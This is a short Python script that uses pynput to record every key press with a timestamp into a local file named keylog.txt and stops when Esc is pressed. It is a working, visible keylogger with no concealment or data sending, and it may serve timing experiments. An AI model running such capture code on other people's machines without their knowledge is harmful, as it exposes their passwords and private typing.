from pynput import keyboard
import time


key_press_times = {}
f = open("keylog.txt", "w+")
f.close()


def on_press(key):
    try:
        key_name = key.char
    except AttributeError:
        key_name = str(key)
    press_time = time.time()
    with open("keylog.txt", "a+") as f:
        f.write(f"{key_name} {press_time}\n")
    key_press_times[key_name] = press_time


def on_release(key):
    print(f"{key} released")
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
    pass
